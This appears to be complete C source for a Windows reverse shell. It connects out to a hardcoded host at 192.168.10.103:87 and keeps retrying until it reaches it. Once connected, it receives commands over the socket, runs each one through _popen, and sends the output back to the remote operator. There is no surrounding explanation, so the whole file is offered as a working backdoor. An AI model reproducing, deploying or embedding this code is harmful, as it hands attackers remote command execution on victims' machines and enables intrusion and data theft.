#include <winsock2.h>
#include <windows.h>
#include <stdio.h> // Using C headers is much lighter than <string>

#pragma comment(lib, "Ws2_32.lib")

void ExecuteResidentShell(SOCKET s) {
    char buffer[4096]; 
    char cmdResult[4096];
    
    while (true) {
        int bytes = recv(s, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) break; 

        buffer[bytes] = '\0';

        // Internal Command: Exit (using C-style strstr)
        if (strstr(buffer, "exit")) break;

        // Internal Command: cd (Manual traversal logic)
        if (strncmp(buffer, "cd ", 3) == 0) {
            char* path = buffer + 3;
            // Trim trailing whitespace/newlines
            for(int i = strlen(path)-1; i >= 0 && (path[i]=='\n'||path[i]=='\r'||path[i]==' '); i--) path[i]='\0';
            
            if (SetCurrentDirectoryA(path)) {
                send(s, "OK\n", 3, 0);
            } else {
                send(s, "ERR\n", 4, 0);
            }
            send(s, "CMD_FIN>\n", 9, 0);
            continue;
        }

        // Standard execution
        FILE* fp = _popen(buffer, "r");
        if (fp != NULL) {
            while (fgets(cmdResult, sizeof(cmdResult), fp) != NULL) {
                send(s, cmdResult, (int)strlen(cmdResult), 0);
            }
            _pclose(fp);
        }
        
        send(s, "\nCMD_FIN>\n", 10, 0);
        memset(buffer, 0, sizeof(buffer));
    }
}

int main() {
    WSADATA w;
    WSAStartup(MAKEWORD(2, 2), &w);

    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sockaddr_in a = { 0 };
    a.sin_family = AF_INET;
    a.sin_port = htons(87);
    a.sin_addr.s_addr = inet_addr("192.168.10.103");

    while (WSAConnect(s, (SOCKADDR*)&a, sizeof(a), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        Sleep(5000);
    }
    ExecuteResidentShell(s);

    closesocket(s);
    WSACleanup();
    return 0;
}